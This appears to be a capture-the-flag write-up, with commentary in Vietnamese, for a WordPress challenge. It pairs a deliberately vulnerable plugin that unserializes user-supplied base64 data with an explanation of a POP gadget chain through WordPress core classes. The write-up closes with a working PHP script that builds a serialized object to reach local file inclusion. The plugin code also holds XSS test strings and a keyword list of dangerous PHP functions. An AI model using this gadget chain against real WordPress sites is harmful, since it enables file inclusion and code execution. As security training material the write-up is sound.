

#Task

<!--more-->

# Task-29-08-2025

![Alt text](/images/fancy.png)

```php
<?php

if (!defined('ABSPATH')) {
    exit;
}

class SecureTableGenerator
{
    private $data;
    private $headers;
    private $tableClass;
    private $allowedTags;
    
    public function __construct($data = [], $headers = [], $tableClass = 'beautiful-table')
    {
        // Initialize allowedTags first before any sanitization calls
        $this->allowedTags = ['b', 'i', 'strong', 'em', 'u'];
        $this->setData($data);
        $this->setHeaders($headers);
        $this->tableClass = $this->sanitizeString($tableClass);
    }
    
    /**
     * Secure data setter with validation
     */
    public function setData($data)
    {
        if (!is_array($data)) {
            throw new InvalidArgumentException("Data must be an array");
        }
        
        // Sanitize all data entries
        $this->data = [];
        foreach ($data as $row) {
            if (!is_array($row)) {
                throw new InvalidArgumentException("Each data row must be an array");
            }
            $sanitizedRow = [];
            foreach ($row as $cell) {
                $sanitizedRow[] = $this->sanitizeString($cell);
            }
            $this->data[] = $sanitizedRow;
        }
    }
    
    /**
     * Secure headers setter with validation
     */
    public function setHeaders($headers)
    {
        if (!is_array($headers)) {
            throw new InvalidArgumentException("Headers must be an array");
        }
        
        $this->headers = [];
        foreach ($headers as $header) {
            $this->headers[] = $this->sanitizeString($header);
        }
    }
    
    /**
     * Sanitize string input to prevent XSS
     */
    private function sanitizeString($input)
    {
        if (!is_string($input)) {
            return '';
        }
        
        // Remove dangerous characters and encode HTML entities
        $sanitized = htmlspecialchars(trim($input), ENT_QUOTES | ENT_HTML5, 'UTF-8');
        
        // Ensure allowedTags is properly initialized with robust checking
        if (!isset($this->allowedTags) || !is_array($this->allowedTags) || empty($this->allowedTags)) {
            $this->allowedTags = ['b', 'i', 'strong', 'em', 'u'];
        }
        
        // Safe implode with additional validation
        $allowedTagsString = '';
        if (is_array($this->allowedTags) && count($this->allowedTags) > 0) {
            $allowedTagsString = '<' . implode('><', $this->allowedTags) . '>';
        }
        
        // Allow only specific safe HTML tags
        $sanitized = strip_tags($sanitized, $allowedTagsString);
        
        return $sanitized;
    }
    
    /**
     * Magic method called after unserialization
     * Validates and secures the object state with complex security checks
     */
    public function __wakeup()
    {
        // Complex validation timestamp check 
        $wakeupStartTime = microtime(true);
        
        // Security: Check for object injection attacks
        $this->validateObjectIntegrity();
        
        // Deep property validation with complex logic
        $this->performComplexValidation();
        
        // Multi-layer sanitization process
        $this->executeAdvancedSanitization();
        
        // Security rate limiting simulation
        $this->implementSecurityThrottling();
        
        // Complex data normalization
        $this->normalizeDataStructure();
        
        // Advanced security checks
        $this->performAdvancedSecurityChecks();
        
        // Reset security properties with validation
        $this->resetSecurityProperties();
        
        // Log wakeup completion time for security monitoring
        $wakeupEndTime = microtime(true);
        $this->logSecurityEvent($wakeupStartTime, $wakeupEndTime);
    }
    
    /**
     * Validate object integrity against tampering
     */
    private function validateObjectIntegrity()
    {
        // Check for suspicious property modifications
        $expectedProperties = ['data', 'headers', 'tableClass', 'allowedTags'];
        $actualProperties = array_keys(get_object_vars($this));
        
        foreach ($actualProperties as $prop) {
            if (!in_array($prop, $expectedProperties)) {
                // Remove suspicious properties
                unset($this->$prop);
            }
        }
        
        // Validate property types with complex logic
        if (!is_array($this->data) && !is_null($this->data)) {
            $this->data = [];
        }
        
        if (!is_array($this->headers) && !is_null($this->headers)) {
            $this->headers = [];
        }
        
        if (!is_string($this->tableClass) && !is_null($this->tableClass)) {
            $this->tableClass = 'beautiful-table';
        }
        
        // Initialize allowedTags if not properly set
        if (!is_array($this->allowedTags) || empty($this->allowedTags)) {
            $this->allowedTags = ['b', 'i', 'strong', 'em', 'u'];
        }
    }
    
    /**
     * Perform complex validation with multiple checks
     */
    private function performComplexValidation()
    {
        // Complex data structure validation
        if (is_array($this->data)) {
            $maxRows = 1000; // Security limit
            $maxCols = 50;   // Security limit
            
            if (count($this->data) > $maxRows) {
                $this->data = array_slice($this->data, 0, $maxRows);
            }
            
            foreach ($this->data as $rowIndex => $row) {
                if (!is_array($row)) {
                    $this->data[$rowIndex] = [];
                    continue;
                }
                
                if (count($row) > $maxCols) {
                    $this->data[$rowIndex] = array_slice($row, 0, $maxCols);
                }
                
                // Validate each cell with complex logic
                foreach ($row as $cellIndex => $cell) {
                    if (is_object($cell) || is_resource($cell)) {
                        $this->data[$rowIndex][$cellIndex] = '[INVALID_DATA_TYPE]';
                    } elseif (is_array($cell)) {
                        $this->data[$rowIndex][$cellIndex] = json_encode($cell);
                    } elseif (strlen((string)$cell) > 1000) {
                        $this->data[$rowIndex][$cellIndex] = substr((string)$cell, 0, 1000) . '...';
                    }
                }
            }
        } else {
            $this->data = [];
        }
        
        // Complex header validation
        if (is_array($this->headers)) {
            $maxHeaders = 50;
            if (count($this->headers) > $maxHeaders) {
                $this->headers = array_slice($this->headers, 0, $maxHeaders);
            }
            
            foreach ($this->headers as $index => $header) {
                if (is_object($header) || is_resource($header) || is_array($header)) {
                    $this->headers[$index] = 'Column_' . ($index + 1);
                } elseif (strlen((string)$header) > 100) {
                    $this->headers[$index] = substr((string)$header, 0, 100) . '...';
                }
            }
        } else {
            $this->headers = [];
        }
    }
    
    /**
     * Execute advanced multi-layer sanitization
     */
    private function executeAdvancedSanitization()
    {
        // Complex sanitization with multiple passes
        $sanitizedData = [];
        
        foreach ($this->data as $rowIndex => $row) {
            if (!is_array($row)) {
                $sanitizedData[] = [];
                continue;
            }
            
            $sanitizedRow = [];
            foreach ($row as $cellIndex => $cell) {
                // Multi-pass sanitization
                $sanitized = $this->multiPassSanitization($cell);
                
                // Additional security checks
                if ($this->containsSuspiciousContent($sanitized)) {
                    $sanitized = '[FILTERED_CONTENT]';
                }
                
                $sanitizedRow[] = $sanitized;
            }
            $sanitizedData[] = $sanitizedRow;
        }
        $this->data = $sanitizedData;
        
        // Sanitize headers with complex logic
        $sanitizedHeaders = [];
        foreach ($this->headers as $header) {
            $sanitized = $this->multiPassSanitization($header);
            if ($this->containsSuspiciousContent($sanitized)) {
                $sanitized = 'Header_' . (count($sanitizedHeaders) + 1);
            }
            $sanitizedHeaders[] = $sanitized;
        }
        $this->headers = $sanitizedHeaders;
        
        // Complex table class sanitization
        $this->tableClass = $this->sanitizeTableClass($this->tableClass);
    }
    
    /**
     * Multi-pass sanitization with various security checks
     */
    private function multiPassSanitization($input)
    {
        if (!is_string($input)) {
            return '';
        }
        
        // Pass 1: Basic sanitization
        $sanitized = htmlspecialchars(trim($input), ENT_QUOTES | ENT_HTML5, 'UTF-8');
        
        // Pass 2: Remove suspicious patterns
        $dangerousPatterns = [
            '/javascript:/i',
            '/vbscript:/i',
            '/onload\s*=/i',
            '/onerror\s*=/i',
            '/onclick\s*=/i',
            '/onmouseover\s*=/i',
            '/expression\s*\(/i',
            '/url\s*\(/i',
            '/import\s*\(/i',
            '/<script/i',
            '/<iframe/i',
            '/<object/i',
            '/<embed/i'
        ];
        
        foreach ($dangerousPatterns as $pattern) {
            $sanitized = preg_replace($pattern, '[FILTERED]', $sanitized);
        }
        
        // Pass 3: Whitelist allowed tags
        $allowedTagsString = '';
        if (is_array($this->allowedTags) && !empty($this->allowedTags)) {
            $allowedTagsString = '<' . implode('><', $this->allowedTags) . '>';
        }
        $sanitized = strip_tags($sanitized, $allowedTagsString);
        
        // Pass 4: Final validation
        if (strlen($sanitized) > 500) {
            $sanitized = substr($sanitized, 0, 500) . '...';
        }
        
        return $sanitized;
    }
    
    /**
     * Check for suspicious content patterns
     */
    private function containsSuspiciousContent($content)
    {
        $suspiciousKeywords = [
            'eval', 'exec', 'system', 'shell_exec', 'passthru',
            'file_get_contents', 'fopen', 'fwrite', 'unlink',
            'base64_decode', 'gzinflate', 'str_rot13'
        ];
        
        $lowerContent = strtolower($content);
        
        foreach ($suspiciousKeywords as $keyword) {
            if (strpos($lowerContent, $keyword) !== false) {
                return true;
            }
        }
        
        return false;
    }
    
    /**
     * Sanitize table class with complex validation
     */
    private function sanitizeTableClass($class)
    {
        if (!is_string($class) || empty($class)) {
            return 'beautiful-table';
        }
        
        // Remove all non-alphanumeric characters except hyphens and underscores
        $sanitized = preg_replace('/[^a-zA-Z0-9_-]/', '', $class);
        
        // Ensure it starts with a letter
        if (!preg_match('/^[a-zA-Z]/', $sanitized)) {
            $sanitized = 'table-' . $sanitized;
        }
        
        // Limit length
        if (strlen($sanitized) > 50) {
            $sanitized = substr($sanitized, 0, 50);
        }
        
        return $sanitized ?: 'beautiful-table';
    }
    
    /**
     * Implement security throttling simulation
     */
    private function implementSecurityThrottling()
    {
        // Simulate rate limiting check
        static $wakeupCount = 0;
        $wakeupCount++;
        
        if ($wakeupCount > 100) {
            // Reset counter and add delay for security
            $wakeupCount = 0;
            usleep(1000); // 1ms delay
        }
    }
    
    /**
     * Normalize data structure for consistency
     */
    private function normalizeDataStructure()
    {
        // Ensure data consistency
        if (!empty($this->headers) && !empty($this->data)) {
            $headerCount = count($this->headers);
            
            foreach ($this->data as $index => $row) {
                $rowCount = count($row);
                
                if ($rowCount < $headerCount) {
                    // Pad with empty strings
                    $this->data[$index] = array_pad($row, $headerCount, '');
                } elseif ($rowCount > $headerCount) {
                    // Trim excess columns
                    $this->data[$index] = array_slice($row, 0, $headerCount);
                }
            }
        }
    }
    
    /**
     * Perform advanced security checks
     */
    private function performAdvancedSecurityChecks()
    {
        // Check for serialization bombs
        $totalDataSize = 0;
        
        foreach ($this->data as $row) {
            foreach ($row as $cell) {
                $totalDataSize += strlen($cell);
            }
        }
        
        if ($totalDataSize > 100000) { // 100KB limit
            $this->data = [['Data size exceeded security limit']];
            $this->headers = ['Security Notice'];
        }
        
        // Validate object state integrity
        if (count($this->data) === 0 && count($this->headers) > 0) {
            $this->headers = [];
        }
    }
    
    /**
     * Reset security properties with validation
     */
    private function resetSecurityProperties()
    {
        
        // Validate allowed tags
        $safeTags = ['b', 'i', 'strong', 'em', 'u', 'span', 'div', 'p'];
        $validatedTags = [];
        
        foreach ($this->allowedTags as $tag) {
            if (in_array($tag, $safeTags)) {
                $validatedTags[] = $tag;
            }
        }
        
        $this->allowedTags = $validatedTags ?: ['b', 'i', 'strong', 'em', 'u'];
    }
    
    /**
     * Log security event for monitoring
     */
    private function logSecurityEvent($startTime, $endTime)
    {
        $executionTime = round(($endTime - $startTime) * 1000, 2);
        
        // Simulate security logging
        if ($executionTime > 100) { // If wakeup took more than 100ms
            error_log("SecureTableGenerator: Slow wakeup detected ({$executionTime}ms)");
        }
        
        // Additional security validation
        if (count($this->data) > 500 || count($this->headers) > 20) {
            error_log("SecureTableGenerator: Large data structure detected");
        }
    }
    
    /**
     * Generate beautiful HTML table
     */
    public function generateTable()
    {
        $html = $this->getTableStyles();
        $html .= '<table class="' . $this->tableClass . '">';
        
        // Add headers if they exist
        if (!empty($this->headers)) {
            $html .= '<thead><tr>';
            foreach ($this->headers as $header) {
                $html .= '<th>' . $header . '</th>';
            }
            $html .= '</tr></thead>';
        }
        
        // Add data rows
        $html .= '<tbody>';
        foreach ($this->data as $row) {
            $html .= '<tr>';
            foreach ($row as $cell) {
                $html .= '<td>' . $cell . '</td>';
            }
            $html .= '</tr>';
        }
        $html .= '</tbody></table>';
        
        return $html;
    }
    
    /**
     * Get beautiful CSS styles for the table
     */
    private function getTableStyles()
    {
        return '
        <style>
        .beautiful-table {
            border-collapse: collapse;
            width: 100%;
            margin: 20px 0;
            font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        
        .beautiful-table thead tr {
            background: rgba(255,255,255,0.2);
            color: white;
            text-align: left;
            font-weight: bold;
        }
        
        .beautiful-table th,
        .beautiful-table td {
            padding: 15px 20px;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .beautiful-table tbody tr {
            background: rgba(255,255,255,0.9);
            transition: all 0.3s ease;
        }
        
        .beautiful-table tbody tr:hover {
            background: rgba(255,255,255,1);
            transform: scale(1.02);
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        }
        
        .beautiful-table tbody tr:nth-child(even) {
            background: rgba(255,255,255,0.7);
        }
        
        .beautiful-table tbody tr:nth-child(even):hover {
            background: rgba(255,255,255,0.95);
        }
        
        .beautiful-table td {
            color: #333;
        }
        
        .beautiful-table th {
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 14px;
        }
        </style>';
    }
    
    /**
     * Convert to string representation
     */
    public function __toString()
    {
        return $this->generateTable();
    }
}

function index() {
    // User Input Form for Interactive Testing
    echo '<div style="background: #f0f0f0; padding: 20px; margin: 20px 0; border-radius: 8px;">';
    echo '<h2>🔧 Interactive Table Generator</h2>';
    echo '<form method="POST" style="margin-bottom: 20px;">';
    
    echo '<h3>Unserialize Existing Data</h3>';
    echo '<label>Base64 Encoded Serialized Data (paste base64 encoded serialized string here):</label><br>';
    echo '<textarea name="serialized_data" rows="4" cols="80" placeholder="Paste base64 encoded serialized data here...">' . 
         (isset($_POST['serialized_data']) ? htmlspecialchars($_POST['serialized_data']) : '') . '</textarea><br><br>';
    
    echo '<input type="submit" name="generate" value="Generate Table" style="background: #007cba; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer;">';
    echo '<input type="submit" name="demo" value="Show Demo" style="background: #28a745; color: white; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin-left: 10px;">';
    echo '</form>';
    echo '</div>';
    
    // Process User Input
    try {
        if (isset($_POST['generate'])) {
            echo "<h2>🎯 User Generated Table</h2>";
            
            // Check if user wants to unserialize existing data
            if (!empty($_POST['serialized_data'])) {
                echo "<h3>Attempting to unserialize user data...</h3>";
                
                $userBase64Data = trim($_POST['serialized_data']);
                echo "<p><strong>Base64 Input Data:</strong> " . htmlspecialchars(substr($userBase64Data, 0, 100)) . "...</p>";
                
                // Decode base64 first
                $userSerializedData = base64_decode($userBase64Data, true);
                
                if ($userSerializedData === false) {
                    echo "<p style='color: red;'><strong>❌ Invalid base64 encoding</strong></p>";
                    echo "<p>Please provide valid base64 encoded serialized data.</p>";
                } else {
                    echo "<p><strong>Decoded Serialized Data:</strong> " . htmlspecialchars(substr($userSerializedData, 0, 150)) . "...</p>";
                    
                    // Attempt to unserialize user input
                    $userTable = @unserialize($userSerializedData);
                    
                    if ($userTable instanceof SecureTableGenerator) {
                        echo "<p style='color: green;'><strong>✅ Successfully unserialized user data!</strong></p>";
                        echo "<p><em>Note: __wakeup() method automatically secured the data</em></p>";
                        echo $userTable->generateTable();
                    } else {
                        echo "<p style='color: red;'><strong>❌ Failed to unserialize data or invalid object type</strong></p>";
                        echo "<p>Please provide valid SecureTableGenerator serialized data.</p>";
                    }
                }
            } 
            // Otherwise create new table from user input
            else {
                $userData = [];
                $userHeaders = [];
                $userTableClass = 'beautiful-table';
                
                // Parse user data
                if (!empty($_POST['table_data'])) {
                    $decodedData = json_decode($_POST['table_data'], true);
                    if (json_last_error() === JSON_ERROR_NONE && is_array($decodedData)) {
                        $userData = $decodedData;
                    } else {
                        throw new Exception("Invalid JSON format for table data");
                    }
                }
                
                if (!empty($_POST['headers'])) {
                    $decodedHeaders = json_decode($_POST['headers'], true);
                    if (json_last_error() === JSON_ERROR_NONE && is_array($decodedHeaders)) {
                        $userHeaders = $decodedHeaders;
                    } else {
                        throw new Exception("Invalid JSON format for headers");
                    }
                }
                
                if (!empty($_POST['table_class'])) {
                    $userTableClass = $_POST['table_class'];
                }
                
                if (empty($userData)) {
                    throw new Exception("Please provide table data");
                }
                
                // Create table from user input
                $userTable = new SecureTableGenerator($userData, $userHeaders, $userTableClass);
                
                // Show serialization process
                $userSerialized = serialize($userTable);
                echo "<h3>Serialization Process:</h3>";
                echo "<p><strong>Serialized Data (first 150 chars):</strong></p>";
                echo "<pre style='background: #f8f8f8; padding: 10px; border: 1px solid #ddd; overflow-x: auto;'>" . 
                     htmlspecialchars(substr($userSerialized, 0, 150)) . "...</pre>";
                
                // Unserialize and display
                echo "<h3>Unserialization with __wakeup() Security:</h3>";
                $userUnserialized = unserialize($userSerialized);
                echo "<p style='color: green;'><strong>✅ Data processed through __wakeup() security checks</strong></p>";
                echo $userUnserialized->generateTable();
                
                // Show the serialized data for copy/paste as base64
                echo "<h3>📋 Copy This Base64 Encoded Serialized Data:</h3>";
                $userSerializedBase64 = base64_encode($userSerialized);
                echo "<textarea readonly rows='6' cols='100' style='font-family: monospace; font-size: 12px;'>" . 
                     htmlspecialchars($userSerializedBase64) . "</textarea>";
            }
            
        } elseif (isset($_POST['demo']) || !isset($_POST['generate'])) {
            // Original demo code
            echo "<h2>📋 Demo Examples</h2>";
            
            // Create sample data
            $sampleData = [
                ['John Doe', 'john@example.com', 'Developer'],
                ['Jane Smith', 'jane@example.com', 'Designer'],
                ['Bob Johnson', 'bob@example.com', 'Manager'],
                ['Alice Brown', 'alice@example.com', 'Analyst']
            ];
            
            $headers = ['Name', 'Email', 'Position'];
            
            // Create table generator
            $table = new SecureTableGenerator($sampleData, $headers);
            
            // Test serialization and unserialization
            $serialized = serialize($table);
            echo "<h3>Standard Serialization Demo:</h3>";
            echo "<p><strong>Serialized Data (first 100 chars):</strong></p>";
            echo "<pre style='background: #f8f8f8; padding: 10px; border: 1px solid #ddd;'>" . htmlspecialchars(substr($serialized, 0, 100)) . "...</pre>";
            
            // Unserialize and display
            $unserialized = unserialize($serialized);
            echo "<h3>Beautiful Secure Table:</h3>";
            echo $unserialized->generateTable();
            
            // Demonstrate security - attempt to inject malicious content
            echo "<h3>🛡️ Security Test with Malicious Input:</h3>";
            $maliciousData = [
                ['<script>alert("XSS")</script>Normal Name', 'test@test.com', 'Dev'],
                ['Name', '<img src=x onerror=alert("XSS")>', 'Position'],
                ['Evil', 'javascript:alert("hack")', 'onload=alert("xss")']
            ];
            
            $secureTable = new SecureTableGenerator($maliciousData, ['Name', 'Email', 'Role']);
            $serializedSecure = serialize($secureTable);
            $unserializedSecure = unserialize($serializedSecure);
            
            echo "<p><strong>🔒 Malicious input automatically secured by __wakeup():</strong></p>";
            echo $unserializedSecure->generateTable();
            
            // Show example serialized data for testing as base64
            echo "<h3>🧪 Test Data for Unserialization:</h3>";
            echo "<p>Copy this base64 encoded serialized data and paste it in the form above:</p>";
            $serializedBase64 = base64_encode($serialized);
            echo "<textarea readonly rows='4' cols='100' style='font-family: monospace; font-size: 12px;'>" . 
                 htmlspecialchars($serializedBase64) . "</textarea>";
        }
        
    } catch (Exception $e) {
        echo "<div style='color: red; padding: 15px; border: 2px solid red; border-radius: 8px; margin: 15px 0; background: #ffe6e6;'>";
        echo "<strong>⚠️ Error:</strong> " . htmlspecialchars($e->getMessage());
        echo "</div>";
    }
}

// Replace default WordPress frontend
add_action('template_redirect', function() {
    // Only replace frontend for non-admin pages and non-login pages
    if (!is_admin() && !is_login()) {
        // Start output buffering to capture our content
        ob_start();
        
        // Include our custom frontend
        index();
        
        // Get the buffered content
        $content = ob_get_clean();
        
        // Send proper headers
        header('Content-Type: text/html; charset=UTF-8');
        
        // Output our custom HTML structure
        echo '<!DOCTYPE html>';
        echo '<html lang="en">';
        echo '<head>';
        echo '<meta charset="UTF-8">';
        echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
        echo '<title>Fancy Table Generator</title>';
        echo '<style>';
        echo 'body { font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif; margin: 0; padding: 20px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; }';
        echo '.container { max-width: 1200px; margin: 0 auto; background: white; border-radius: 15px; padding: 30px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }';
        echo 'h1 { text-align: center; color: #333; margin-bottom: 30px; font-size: 2.5em; }';
        echo '</style>';
        echo '</head>';
        echo '<body>';
        echo '<div class="container">';
        echo '<h1>🎨 Fancy Table Generator</h1>';
        echo $content;
        echo '</div>';
        echo '</body>';
        echo '</html>';
        
        // Exit to prevent WordPress from loading its default template
        exit;
    }
});
```

- Nhìn chung website này cho phép ta đưa base64(serialized_string) hợp lệ sau đó server sẽ base64_decode -> unserialize -> chạy các magic method

```PHP
    public function __wakeup()
    {
        // Complex validation timestamp check 
        $wakeupStartTime = microtime(true);
        
        // Security: Check for object injection attacks
        $this->validateObjectIntegrity();
        
        // Deep property validation with complex logic
        $this->performComplexValidation();
        
        // Multi-layer sanitization process
        $this->executeAdvancedSanitization();
        
        // Security rate limiting simulation
        $this->implementSecurityThrottling();
        
        // Complex data normalization
        $this->normalizeDataStructure();
        
        // Advanced security checks
        $this->performAdvancedSecurityChecks();
        
        // Reset security properties with validation
        $this->resetSecurityProperties();
        
        // Log wakeup completion time for security monitoring
        $wakeupEndTime = microtime(true);
        $this->logSecurityEvent($wakeupStartTime, $wakeupEndTime);
    }
```

- Nếu ta để ý thì trong quá trình _wakeup() thì hàm resetSecurityProperties() có logic xử lý $allowedTags

```PHP
    private function resetSecurityProperties()
    {
        
        // Validate allowed tags
        $safeTags = ['b', 'i', 'strong', 'em', 'u', 'span', 'div', 'p'];
        $validatedTags = [];
        
        foreach ($this->allowedTags as $tag) {
            if (in_array($tag, $safeTags)) {
                $validatedTags[] = $tag;
            }
        }
        
        $this->allowedTags = $validatedTags ?: ['b', 'i', 'strong', 'em', 'u'];
    }
```

- Khi $allowedTags bị đưa thành một object thay vì array, PHP trong quá trình xử lý sẽ gọi đến magic method của object đó

- Tại đây, nếu object ta đưa vào là một class trong WordPress core có sẵn gadget, thì gadget này sẽ được kích hoạt

- Một gadget điển hình trong WordPress là WP_Block_Patterns_Registry, class này có thể load file pattern từ disk, từ đó ta có khả năng Local File Read nếu chèn được path chưa code PHP

- Nhưng để trigger được WP_Block_Patterns_Registry, ta không thể nhét thẳng nó vào payload và mong nó tự đọc file, vì WordPress định nghĩa class này chỉ đơn thuần chứa $registered_patterns, nó không có sẵn magic method như __toString() hay __wakeup() để tự động thực thi khi unserialize.

- Để trigger được gadget, ta cần tìm một class khác trong core WordPress có sử dụng hoặc xử lý WP_Block_Patterns_Registry, và trong quá trình xử lý đó sẽ gọi tới property filePath.

- Ở đây, WP_HTML_Tag_Processor chính là cầu nối:

```PHP

	public function __toString(): string {
		return $this->get_updated_html();
	}

	public function get_updated_html(): string {
		$requires_no_updating = 0 === count( $this->classname_updates ) && 0 === count( $this->lexical_updates );


		if ( $requires_no_updating ) {
			return $this->html;
		}


		$before_current_tag = $this->token_starts_at ?? 0; 


		$this->class_name_updates_to_attributes_updates();
		$before_current_tag += $this->apply_attributes_updates( $before_current_tag );


		$this->bytes_already_parsed = $before_current_tag;
		$this->base_class_next_token();

		return $this->html;
	}
```
- Ở dòng apply_attributes_updates() dữ liệu sẽ được update lên $this->html , chính lúc này WordPress chạm vào $this->attributes,

- attributes lúc này là  WP_Block_List

```PHP
	public function offsetGet( $offset ) {
		$block = $this->blocks[ $offset ];

		if ( isset( $block ) && is_array( $block ) ) {
			$block = new WP_Block( $block, $this->available_context, $this->registry );

			$this->blocks[ $offset ] = $block;
		}

		return $block;
	}
```

- Khi trigger được WP_Block_List thì hàm offsetGet được gọi
- Khi tạo new WP_Block() nó truyền vào
    - $block (array dữ liệu block)
    - $this->available_context
    - $this->registry

```php
public function __construct( $block, $available_context = array(), $registry = null ) {
    $this->parsed_block = $block;
    $this->name         = $block['blockName'];

    if ( is_null( $registry ) ) {
        $registry = WP_Block_Type_Registry::get_instance();
    }

    $this->registry = $registry;

    $this->block_type = $registry->get_registered( $this->name );

    $this->available_context = $available_context;

    $this->refresh_context_dependents();
}

```

- ở đây nó check nếu $registry rỗng thì nó mặc định sẽ dùng WP_Block_Type_Registry::get_instance(), nhưng mục tiêu ban đầu của chúng ta là trigger được WP_Block_Patterns_Registry để có thể LFI

- Vậy nên ta chuyển vào $registry WP_Block_Patterns_Registry::get_registered()

```php

	public function get_registered( $pattern_name ) {
		if ( ! $this->is_registered( $pattern_name ) ) {
			return null;
		}

		$pattern            = $this->registered_patterns[ $pattern_name ];
		$content            = $this->get_content( $pattern_name );
		$pattern['content'] = apply_block_hooks_to_content(
			$content,
			$pattern,
			'insert_hooked_blocks_and_set_ignored_hooked_blocks_metadata'
		);

		return $pattern;
	}

	private function get_content( $pattern_name, $outside_init_only = false ) {
		if ( $outside_init_only ) {
			$patterns = &$this->registered_patterns_outside_init;
		} else {
			$patterns = &$this->registered_patterns;
		}
		if ( ! isset( $patterns[ $pattern_name ]['content'] ) && isset( $patterns[ $pattern_name ]['filePath'] ) ) {
			ob_start();
			include $patterns[ $pattern_name ]['filePath'];
			$patterns[ $pattern_name ]['content'] = ob_get_clean();
			unset( $patterns[ $pattern_name ]['filePath'] );
		}
		return $patterns[ $pattern_name ]['content'];
	}
```

- Khi $registry trỏ tới WP_Block_Patterns_Registry::get_registered() và gọi hàm get_registerd($pattern_name) và check xem pattern có được đăng kí chưa , nếu có nó gọi tiếp get_content($pattern_name)

```php
include $patterns[ $pattern_name ]['filePath'];
```

- Lúc này nếu ta đặt filePath trỏ đến một file PHP mã độc trong file sec được thì thi dẫn đến LFI

```php
<?php
namespace {

    class WP_HTML_Tag_Processor {
        public $html = "init";
        public $parsing_namespace = 'html';
        public $attributes;
        public $classname_updates = [1];

        public function __construct($attrs) {
        $this->html = "foobar";          // Mỗi khi khởi tạo thì $html thành “foobar”
        $this->attributes = $attrs;      // Gán object (ở đây là WP_Block_List) vào
    }
    }

    class WP_Block_List {
        public $blocks;      // Lưu một số thông tin block
        public $registry;    // Nơi giữ reference tới Registry

        public function __construct($reg) {
            $this->blocks = ['class' => ['blockName'=> 'test', 'extra' => 'keep']];
            $this->registry = $reg;         
        }
    }
    //WP_Block_List là nút trung gian để giữ WP_Block_Patterns_Registry

    final class WP_Block_Patterns_Registry {
        public $registered_patterns;  

        public function __construct($file) {
            // Thêm payload vào key filePath
            $this->registered_patterns = [
                'test' => [
                    'filePath' => $file,       
                ]
            ];
        }
    }


    class SecureTableGenerator {
        private $allowedTags;   
        private $headers;
        private $tableClass;
        private $data;

        public function __construct($tags) {
            $this->allowedTags = $tags;  
        }
    }

    $payloadPath = $argv[1];

    $registry   = new WP_Block_Patterns_Registry($payloadPath);
    $blockList  = new WP_Block_List($registry);
    $processor  = new WP_HTML_Tag_Processor($blockList);
    $exploitObj = new SecureTableGenerator([$processor]);

    echo base64_encode(serialize($exploitObj));
}
?>

```





